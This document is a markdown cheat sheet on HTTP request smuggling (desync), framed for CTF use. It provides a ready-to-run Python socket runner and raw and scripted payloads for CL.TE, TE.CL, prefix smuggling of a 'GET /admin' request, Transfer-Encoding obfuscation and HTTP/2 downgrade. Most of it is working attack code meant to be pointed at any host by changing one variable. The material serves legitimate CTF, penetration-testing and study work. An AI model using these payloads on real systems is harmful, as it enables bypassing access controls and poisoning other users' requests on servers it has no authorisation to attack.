# Desync

Use on CTF infra you control or challenge endpoints. Start with one harmless probe, then confirm with a visible prefix.

## Runner

Paste this once, change `HOST` / `PORT` / `TLS`, then reuse it for every section below.

```python
import socket
import ssl
import time

HOST = "target.com"
PORT = 443
TLS = True
TIMEOUT = 5
DELAY = 0.2


def connect():
    s = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    if TLS:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=HOST)
    return s


def recv_all(s, limit=20000):
    s.settimeout(TIMEOUT)
    out = b""
    try:
        while len(out) < limit:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except (TimeoutError, socket.timeout):
        pass
    return out


def send_pair(first, second, delay=DELAY):
    s = connect()
    s.sendall(first)
    time.sleep(delay)
    r1 = recv_all(s)
    print("=== FIRST ===")
    print(r1.decode("latin-1", "replace"))

    s.sendall(second)
    time.sleep(delay)
    r2 = recv_all(s)
    print("=== SECOND ===")
    print(r2.decode("latin-1", "replace"))

    s.close()
    return r1, r2


def raw(text):
    text = text.replace("\r\n", "\n")
    if text.startswith("\n"):
        text = text[1:]
    return text.replace("\n", "\r\n").encode()


def req(method, path, headers=None, body=b"", connection="keep-alive"):
    headers = dict(headers or {})
    headers.setdefault("Connection", connection)
    lines = [f"{method} {path} HTTP/1.1", f"Host: {HOST}"]
    lines.extend(f"{k}: {v}" for k, v in headers.items())
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body
```

`req()` does **not** add `Content-Length` automatically. That is deliberate: every desync variant needs a different mismatch.

The raw Burp examples use `HOST` as a 4-byte placeholder, so their `Content-Length` values are illustrative. The Python snippets compute lengths from the actual body.

If the first `recv_all()` times out, the server is probably waiting for the second request. `send_pair()` still sends it; the timeout is expected on some desync probes.

## CL.TE

Front-end trusts `Content-Length`, back-end trusts `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: HOST
Content-Length: 6
Transfer-Encoding: chunked
Connection: keep-alive

0

X
```

Python:

```python
# Front-end reads CL bytes. Back-end ends the chunked body at "0\r\n\r\n"
# and leaves PREFIX in the buffer for the next request.
PREFIX = b"X"
BODY = b"0\r\n\r\n" + PREFIX

first = req(
    "POST",
    "/",
    {
        "Content-Length": str(len(BODY)),
        "Transfer-Encoding": "chunked",
    },
    BODY,
)

second = raw(f"""
GET / HTTP/1.1
Host: {HOST}
Connection: close

""")

send_pair(first, second)
```

Change `PREFIX` to `b"GET /admin HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n\r\n"` for a full prefix smuggle.

## TE.CL

Front-end trusts `Transfer-Encoding`, back-end trusts `Content-Length`.

```http
POST / HTTP/1.1
Host: HOST
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

23
GPOST /404 HTTP/1.1
Host: HOST


0

```

`23` is the hex length of `GPOST /404 HTTP/1.1\r\nHost: HOST\r\n\r\n` (35 bytes). If you change `HOST` or the smuggled request, recompute it. The Python snippet does that automatically.

`Content-Length: 4` assumes a 2-digit hex size line (`23\r\n`). If the smuggled request grows past `0xff`, the size line becomes longer and the Python snippet adjusts `Content-Length` with `len(SIZE) + 2`.

Python:

```python
# Front-end parses the chunked body. Back-end reads only the chunk-size line
# because Content-Length is that short, then treats SMUGGLED as the next request.
SMUGGLED = raw(f"""
GPOST /404 HTTP/1.1
Host: {HOST}

""")

SIZE = f"{len(SMUGGLED):x}"
CHUNK = SIZE.encode() + b"\r\n" + SMUGGLED + b"\r\n0\r\n\r\n"

first = req(
    "POST",
    "/",
    {
        "Content-Length": str(len(SIZE) + 2),  # hex digits + CRLF
        "Transfer-Encoding": "chunked",
    },
    CHUNK,
)

second = raw(f"""
GET / HTTP/1.1
Host: {HOST}
Connection: close

""")

send_pair(first, second)
```

The `Content-Length` is computed from the hex chunk-size line, so it still works if `SMUGGLED` grows past 255 bytes.

## Prefix Smuggle

Both headers are present. Front-end uses `Content-Length`, back-end uses chunked and stops at `0\r\n\r\n`.

```http
POST / HTTP/1.1
Host: HOST
Content-Length: 40
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin HTTP/1.1
Host: HOST

```

`40` is `len("0\r\n\r\n" + "GET /admin HTTP/1.1\r\nHost: HOST\r\n\r\n")` with the 4-byte `HOST` placeholder. Recompute it for a different host. The Python snippet does that automatically.

Then send a normal request on the same connection.

Python:

```python
SMUGGLED = raw(f"""
GET /admin HTTP/1.1
Host: {HOST}

""")

BODY = b"0\r\n\r\n" + SMUGGLED

first = req(
    "POST",
    "/",
    {
        "Content-Length": str(len(BODY)),
        "Transfer-Encoding": "chunked",
    },
    BODY,
)

second = raw(f"""
GET / HTTP/1.1
Host: {HOST}
Connection: close

""")

send_pair(first, second)
```

`send_pair()` keeps both requests on one socket. That is the point: the second request must land after the leftover bytes.

## TE Obfuscation

Try one header variant at a time. Keep the body from CL.TE.

```http
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding:	 chunked
Transfer-Encoding : chunked
```

Python:

```python
PREFIX = b"X"
BODY = b"0\r\n\r\n" + PREFIX

TE = "chunked"  # swap with xchunked, "chunked, identity", etc.

first = req(
    "POST",
    "/",
    {
        "Content-Length": str(len(BODY)),
        "Transfer-Encoding": TE,
    },
    BODY,
)

second = raw(f"""
GET / HTTP/1.1
Host: {HOST}
Connection: close

""")

send_pair(first, second)
```

If the header value contains a literal tab, build it directly:

```python
first = req("POST", "/", {
    "Content-Length": str(len(BODY)),
    "Transfer-Encoding": "chunked",
}, BODY).replace(b"Transfer-Encoding: chunked", b"Transfer-Encoding:\tchunked")
```

## HTTP/2 Downgrade

```text
h2 frontend -> h1 backend
content-length kept during downgrade
path/header normalization differs
```

Try:

```http
:method POST
:path /
content-length: 0

GET /admin HTTP/1.1
Host: HOST

```

The runner above is HTTP/1.1 only. Use Burp Repeater with HTTP/2 support, or an `h2` client, for this case. The important part is that the HTTP/1.1 request is sent as the H2 data/body and the front-end downgrades it without fixing the length.

## Confirm

```text
1. Poison with a request for /404 or /canary.
2. Send a normal request on the same connection.
3. Look for shifted status/body.
4. Repeat with a unique marker.
5. Confirm only once; do not spray production endpoints.
```

## What To Change

| Change | Where |
| --- | --- |
| Target host | `HOST` |
| TLS on/off | `TLS = True` / `False` |
| Port | `PORT` |
| Timeout / delay | `TIMEOUT` / `DELAY` |
| Smuggled request | `PREFIX` or `SMUGGLED` |
| Destination path | second argument of `req()` |
| Extra headers | header dict in `req()` |
| TE obfuscation | `TE` variable |
| Full prefix smuggle | set `PREFIX` to a complete HTTP request |

## References

* [PortSwigger HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
* [PortSwigger desync research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [PayloadsAllTheThings request smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling)
